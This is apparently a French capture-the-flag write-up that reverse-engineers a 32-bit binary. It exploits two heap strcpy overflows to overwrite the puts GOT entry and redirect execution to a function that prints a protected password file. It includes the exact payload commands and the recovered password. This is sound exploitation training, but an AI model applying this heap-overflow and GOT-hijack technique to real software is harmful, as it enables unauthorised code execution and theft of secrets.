```
080484f4 <m>:
 80484f4:	55                   	push   ebp
 80484f5:	89 e5                	mov    ebp,esp
 80484f7:	83 ec 18             	sub    esp,0x18
 80484fa:	c7 04 24 00 00 00 00 	mov    DWORD PTR [esp],0x0
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    edx,0x80486e0 ; "%s - %d\n"
 804850b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 804850f:	c7 44 24 04 60 99 04 	mov    DWORD PTR [esp+0x4],0x8049960
 8048516:	08 
 8048517:	89 14 24             	mov    DWORD PTR [esp],edx
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt> ; printf("%s - %d\n", 0x8049960, time(NULL))
 804851f:	c9                   	leave  
 8048520:	c3                   	ret    

08048521 <main>:
 8048521:	55                   	push   ebp
 8048522:	89 e5                	mov    ebp,esp
 8048524:	83 e4 f0             	and    esp,0xfffffff0
 8048527:	83 ec 20             	sub    esp,0x20						; 32
 804852a:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>			; void *alloc_1  = malloc(8)
 8048536:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax		; 
 804853a:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 804853e:	c7 00 01 00 00 00    	mov    DWORD PTR [eax],0x1			; *alloc_1 = 1;
 8048544:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>			; void *alloc_2 = malloc(8)
 8048550:	89 c2                	mov    edx,eax
 8048552:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048556:	89 50 04             	mov    DWORD PTR [eax+0x4],edx		; *(alloc_1 + 4) = alloc_2;
 8048559:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>			; void *alloc_3 = malloc(8)
 8048565:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 8048569:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 804856d:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2			; *alloc_3 = 2;
 8048573:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>			; void *alloc_4 = malloc(8)
 804857f:	89 c2                	mov    edx,eax
 8048581:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 8048585:	89 50 04             	mov    DWORD PTR [eax+0x4],edx		; *(alloc_3 + 4) = alloc_4;
 8048588:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804858b:	83 c0 04             	add    eax,0x4
 804858e:	8b 00                	mov    eax,DWORD PTR [eax]
 8048590:	89 c2                	mov    edx,eax						; edx = argv[1]
 8048592:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048596:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]		; eax = alloc_2;
 8048599:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804859d:	89 04 24             	mov    DWORD PTR [esp],eax
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>			; strpcpy(alloc_2, argv[1])
 80485a5:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80485a8:	83 c0 08             	add    eax,0x8
 80485ab:	8b 00                	mov    eax,DWORD PTR [eax]
 80485ad:	89 c2                	mov    edx,eax						; edx = argv[2]
 80485af:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80485b3:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]
 80485b6:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485ba:	89 04 24             	mov    DWORD PTR [esp],eax
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>			; strcpy(alloc_4, argv[2])
 80485c2:	ba e9 86 04 08       	mov    edx,0x80486e9				; 'r'
 80485c7:	b8 eb 86 04 08       	mov    eax,0x80486eb				; "/home/user/level8/.pass"
 80485cc:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485d0:	89 04 24             	mov    DWORD PTR [esp],eax
 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>			; file = fopen("/home/user/level8/.pass", "r")
 80485d8:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80485dc:	c7 44 24 04 44 00 00 	mov    DWORD PTR [esp+0x4],0x44		; 68
 80485e4:	c7 04 24 60 99 04 08 	mov    DWORD PTR [esp],0x8049960	; char *string_ptr
 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>			; fgets(string_ptr, 68, file)
 80485f0:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703	; "~~"
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
 80485fc:	b8 00 00 00 00       	mov    eax,0x0
 8048601:	c9                   	leave  
 8048602:	c3                   	ret    
```

Le but du chall est de lire la réponse du `fgets`. C'est assez "simple", il suffit de changer l'adresse dans `puts` (0x8048703) à `0x8049960` dans laquelle est stockée le résultat du fichier, via deux buffer overflow dans la heap.

On peut override dans le argv[1] lors de la copie pour réécrire l'adresse du *(alloc_3 + 4).
Lors de l'écriture de notre argv[2] dedans, on pourra probablement écrire dans la stack 
ou ailleurs pour changer les adresses.
Ici, je pense qu'il faut injecter un shellcode. Pour ça, on va devoir regarder deux lignes au dessus, nos instructions:
`mov    DWORD PTR [esp],0x8049960`.

On peut voir que les `opcodes` correspondants sont `c7 04 24 60 99 04 08`. Très bien. Donc pour `puts` le contenu du fichier, il suffirait d'écrire `\x08\x04\x99\x60\x24\x04\xc7` à la position `\xf0\x85\x04\x08`.

Après les 4 allocations, notre heap ressemble à ça :
```
(gdb) x/100xw 0x0804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x00000000	0x00000000	0x00000011
0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
```

Donc, on va écrire à la position `0x0804a018`, et on va devoir overflow jusque `0x804a032`. Par conséquent, on a 22 octets de padding
et on a l'adresses où notre opcode doit être écrit, à écrire :
`python -c 'print("A" * 20 + "\xf0\x85\x04\x08")'`

Parfait ! Il ne manque plus qu'à injecter notre opcode :
`python -c 'print("\x60\x24\x04\xc7\x08\x04\x99")'`

Je viens juste de réaliser que ça segfault à chaque essaie. Impossible d'écrire des opcodes dans le programme. Et je viens également de faire control + f sans faire exprès sur l'adresse de la string (`0x8049960`), et il semblerait qu'elle soit utilisée dans ... `m`.
Alors, riez bien, je suis un boulet. Il faut changer la GOT de `put` et la faire pointer vers `m`.

`objdump -R ./level7`:
`08049928 R_386_JUMP_SLOT   puts`

On écrira donc `\xf4\x84\x04\x08` dans l'adresse : `\x28\x99\x04\x08`

Nouvelles payloads :
`python -c 'print("A" * 20 + "\x28\x99\x04\x08")'`
`python -c 'print("\xf4\x84\x04\x08")'`

`./level7 "$(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')" "$(python -c 'print("\xf4\x84\x04\x08")')"`

Password: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`